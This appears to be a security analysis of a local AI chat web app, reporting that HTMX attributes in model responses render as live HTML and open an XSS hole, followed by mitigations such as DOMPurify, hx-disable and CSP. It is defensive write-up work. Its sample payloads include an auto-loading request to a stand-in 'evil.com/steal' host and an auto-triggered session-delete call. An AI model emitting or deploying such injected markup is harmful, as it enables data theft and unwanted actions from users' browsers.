# Security Analysis: Copilot Web Chat

## Critical Vulnerability Found

### XSS via HTMX Injection

**Severity:** CRITICAL  
**Date Discovered:** 2026-01-24  
**Status:** NEEDS FIX

#### Description

When the LLM response contains HTMX attributes (e.g., `hx-post`, `hx-get`, `hx-trigger`), these are rendered as functional HTML in the chat interface. This creates a **Cross-Site Scripting (XSS)** attack vector.

#### Reproduction

1. Ask Copilot about HTMX documentation
2. Response contains example code with HTMX attributes
3. The markdown renderer converts this to HTML
4. HTMX processes the HTML and activates the attributes
5. Functional buttons/forms appear that can make real HTTP requests

#### Impact

- **Arbitrary HTTP requests** from user's browser
- **Session hijacking** if cookies are accessible
- **Data exfiltration** via HTMX requests to external endpoints
- **CSRF attacks** against the local server
- **DOM manipulation** via hx-swap

#### Attack Vectors

```html
<!-- Malicious payloads that could appear in LLM responses -->

<!-- 1. Data exfiltration -->
<div hx-get="https://evil.com/steal?data=..." hx-trigger="load"></div>

<!-- 2. Auto-executing actions -->
<button hx-post="/api/sessions/delete" hx-trigger="load">Delete</button>

<!-- 3. Form injection -->
<form hx-post="/api/message">
  <input name="message" value="malicious command">
  <button>Send</button>
</form>

<!-- 4. Swap attacks -->
<div hx-get="/api/session" hx-swap="outerHTML" hx-target="body"></div>
```

---

## Mitigation Strategies

### Option 1: DOMPurify (Recommended)

Use DOMPurify to sanitize HTML before insertion:

```javascript
// Install: copy DOMPurify to public folder or use CDN
// <script src="purify.min.js"></script>

const clean = DOMPurify.sanitize(dirtyHTML, {
  FORBID_ATTR: ['hx-get', 'hx-post', 'hx-put', 'hx-delete', 'hx-patch',
                'hx-trigger', 'hx-target', 'hx-swap', 'hx-vals',
                'hx-confirm', 'hx-boost', 'hx-push-url', 'hx-on',
                'onclick', 'onerror', 'onload', 'onmouseover'],
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
});
```

### Option 2: HTMX hx-disable

Wrap dynamic content in a container with `hx-disable`:

```html
<div hx-disable>
  <!-- LLM response rendered here - HTMX won't process -->
</div>
```

**Note:** This only works if HTMX respects the attribute during dynamic insertion. Need to verify.

### Option 3: Text-only rendering

Don't render markdown as HTML - display as escaped text:

```javascript
element.textContent = response; // Safe but loses formatting
```

### Option 4: Sandboxed iframe

Render responses in a sandboxed iframe:

```html
<iframe sandbox="allow-same-origin" srcdoc="..."></iframe>
```

### Option 5: Content Security Policy

Add CSP headers to restrict what can execute:

```javascript
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy', 
    "default-src 'self'; script-src 'self'; connect-src 'self'");
  next();
});
```

---

## Recommended Fix

### Immediate: Use hx-disable

Wrap all LLM response content in `hx-disable`:

```javascript
// In script.js addUserBubble()
assistantDiv.innerHTML = `
  <strong>Copilot:</strong>
  <div class="activity-wrapper">...</div>
  <div class="markdown-content streaming-cursor" hx-disable></div>
`;
```

### Complete: Add DOMPurify

1. Download DOMPurify: https://github.com/cure53/DOMPurify
2. Add to public folder
3. Sanitize all HTML before insertion:

```javascript
// In markdown-renderer.js
function renderMarkdown() {
  document.querySelectorAll('[data-markdown] .markdown-content').forEach(el => {
    const raw = el.textContent;
    const html = marked.parse(raw);
    const clean = DOMPurify.sanitize(html, {
      FORBID_ATTR: ['hx-get', 'hx-post', 'hx-put', 'hx-delete', 
                    'hx-trigger', 'hx-target', 'hx-swap', 'hx-vals',
                    'hx-on', 'onclick', 'onerror', 'onload'],
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed']
    });
    el.innerHTML = clean;
  });
}
```

---

## Other Security Considerations

### 1. Local Server Exposure

The server runs on `localhost:3000` - ensure it's not exposed to the network:

```javascript
app.listen(PORT, '127.0.0.1', () => { ... }); // Bind to localhost only
```

### 2. Path Traversal

The `/api/sessions/new` endpoint accepts a `cwd` parameter. Ensure validation:
- ✓ Already checks path exists
- ✓ Already checks is directory
- Consider: restrict to user home or workspace

### 3. Temp File Cleanup

Image attachments create temp files. Ensure cleanup on all error paths:
- ✓ Cleanup in try/catch
- Consider: periodic cleanup of orphaned files

### 4. Session State

Sessions are stored in `~/.copilot/session-state/`. Consider:
- File permissions (should be 600)
- Sensitive data in session history

---

## References

- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [HTMX Security](https://htmx.org/docs/#security)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
